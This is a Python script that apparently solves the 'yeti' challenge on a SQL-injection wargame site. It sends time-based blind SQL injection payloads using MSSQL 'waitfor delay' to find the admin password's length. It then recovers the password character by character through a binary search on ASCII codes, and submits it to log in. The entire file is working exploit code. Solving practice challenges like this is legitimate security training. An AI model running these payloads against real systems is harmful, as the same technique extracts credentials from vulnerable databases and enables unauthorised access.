import requests
import os
import time

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/yeti_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

pw_length = 0

for  i in range(1, 250):

    start = time.time()
    res = requests.get(url, params={'id': f'\' if ({i} <= (select len(pw) from prob_yeti where id=\'admin\')) waitfor delay \'00:00:01\' else waitfor delay \'00:00:00\' --'},cookies=cookie)
    if time.time() - start > 1:
        pw_length = i
    else:
        break

print(f"pw length: {pw_length}")

ans = ""

for i in range(0, pw_length):
    min_code = 0
    max_code = 256
    while min_code + 1 != max_code:
        target = (min_code + max_code) // 2
        start = time.time()
        res = requests.get(url, params={'id': f'\' if ({target} <= (select ascii(substring(pw,{i+1},1)) from prob_yeti where id=\'admin\')) waitfor delay \'00:00:01\' else waitfor delay \'00:00:00\' --'},cookies=cookie)

        if time.time() - start > 1:
            min_code = target
        else:
            max_code = target

    ans += str(chr(min_code))
    print(f"(in progress)ans: {ans}")

res = requests.get(url, params={'id': 'admin', 'pw': ans},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")
